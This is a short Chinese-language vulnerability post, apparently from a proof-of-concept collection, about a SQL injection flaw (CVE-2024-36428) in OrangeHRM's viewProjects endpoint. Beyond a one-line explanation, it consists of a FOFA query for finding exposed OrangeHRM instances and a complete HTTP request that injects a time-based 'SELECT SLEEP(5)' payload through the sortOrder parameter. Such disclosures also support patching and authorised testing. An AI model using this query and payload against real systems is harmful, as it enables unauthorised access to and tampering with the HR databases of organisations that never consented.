## OrangeHRM-viewProjects接口存在SQL注入漏洞(CVE-2024-36428)

 OrangeHRM 这个漏洞是因为在处理用户输入时，没有对输入进行适当的清理或转义，导致攻击者可以通过输入恶意构造的数据来操作或篡改后端数据库的查询。

## fofa

```
app="OrangeHRM-产品"
```

## poc

```
GET /orangehrm-3.3.3/orangehrm-3.3.3/symfony/web/index.php/admin/viewProjects?sortField=customerName&sortOrder=ASC;SELECT%20SLEEP(5) HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Loggedin=True; CookieLanguageName=ZH-CN; CookieAuthType=0; PHPSESSID=c1g00j77qdi2td1cou2qeua321
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
```

![image-20240604124126459](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406041241517.png)